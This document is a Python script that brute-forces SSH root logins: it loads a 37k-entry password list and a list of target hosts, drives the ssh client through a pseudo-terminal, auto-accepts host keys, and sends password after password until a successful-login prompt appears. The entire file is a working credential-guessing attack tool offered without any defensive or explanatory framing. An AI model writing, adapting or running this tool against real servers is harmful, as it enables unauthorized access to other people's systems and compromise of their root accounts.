import os
import re
import pty
import time
import select
import logging
import threading


STAGE_UNKNOWN, STAGE_CERT, STAGE_CONFIRM, STAGE_LOGIN, STAGE_DENIED, STAGE_OK = -1, 0, 1, 2, 3, 4
password = list()
targets = list()


def init_password():
    with open('password/37k.txt', encoding='utf-8') as f:
        for line in f:
            line = line.rstrip('\n')
            password.append(line)


def init_targets():
    with open('targets/22.txt', encoding='utf-8') as f:
        for line in f:
            line = line.rstrip('\n')
            targets.append(line)


def expect(prompt):
    prompt = prompt.decode(encoding='utf-8')
    #
    pattern = [r"(denied.+publickey)",
               r"(Are you sure you want to continue connecting)",
               r"((?!Permission denied, please try again).+(?=password))",
               r"((?=Permission denied, please try again).+(?=password))",
               r"(Last login)"]
    m = re.search('|'.join(pattern), prompt, re.DOTALL)
    if m is None:
        return STAGE_UNKNOWN
    elements = m.groups()
    elements = [e is not None for e in elements]
    if sum(elements) != 1:
        return STAGE_UNKNOWN
    idx = elements.index(True)
    return [STAGE_CERT, STAGE_CONFIRM, STAGE_LOGIN, STAGE_DENIED, STAGE_OK][idx]


def test_expect():
    assert STAGE_LOGIN == expect(b"root@yun.1415926.science's password: ")
    assert STAGE_DENIED == expect(b"Permission denied, please try again.\r\r\nroot@yun.1415926.science's password: ")


def main(host):
    print(host)
    pid, fd = pty.fork()
    if pid == 0:
        os.execlp('/usr/bin/ssh', 'ssh', host)
    else:
        for p in password:
            # check if child is alive,
            try:
                status_pid, status_exit = os.waitpid(pid, os.WNOHANG)
                if status_pid == 0:
                    assert status_exit == 0
                    # logging.debug('child {0} is alive'.format(pid))
                else:
                    assert pid == status_pid
                    logging.debug('child {0} exit with {1}'.format(pid, status_exit))
            except OSError as e:
                if e.errno == 10:  # [Errno 10] No child processes
                    break
                else:
                    logging.warning('unhandled exception: {0} {1}'.format(type(e), e))
            # check if child is readable
            try:
                rl, _, _ = select.select([fd], [], [], 8.0)
                if len(rl):
                    prompt = os.read(fd, 4096)
                    stage = expect(prompt)
                    if stage == STAGE_UNKNOWN:
                        logging.debug('STAGE_UNKNOWN: {0}'.format(prompt))
                    elif stage == STAGE_CERT:
                        logging.debug('STAGE_CERT: {0}'.format(prompt))
                    elif stage == STAGE_CONFIRM:
                        logging.debug('STAGE_CONFIRM: {0}'.format(prompt))
                        os.write(fd, b'yes\n')
                    elif stage == STAGE_LOGIN:
                        logging.debug('STAGE_LOGIN: {0}'.format(prompt))
                        os.write(fd, p.encode(encoding='utf-8') + b'\n')
                        logging.debug('send {0}'.format(p))
                        # os.write(fd, b'root\n')
                    elif stage == STAGE_DENIED:
                        logging.debug('STAGE_DENIED: {0}'.format(prompt))
                        os.write(fd, p.encode(encoding='utf-8') + b'\n')
                        logging.debug('send {0}'.format(p))
                        # os.write(fd, b'bosskwei-vps\n')
                    elif stage == STAGE_OK:
                        logging.debug('STAGE_OK: {0}'.format(prompt))
                        break
            except OSError as e:
                if e.errno == 5:  # [Errno 5] Input/output error
                    logging.debug('[Errno 5] Input/output error')
                else:
                    logging.warning('unhandled exception: {0} {1}'.format(type(e), e))
            #
            time.sleep(1.0)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    init_targets()
    init_password()
    try:
        for t in targets:
            main('root@' + t)
    except KeyboardInterrupt:
        pass
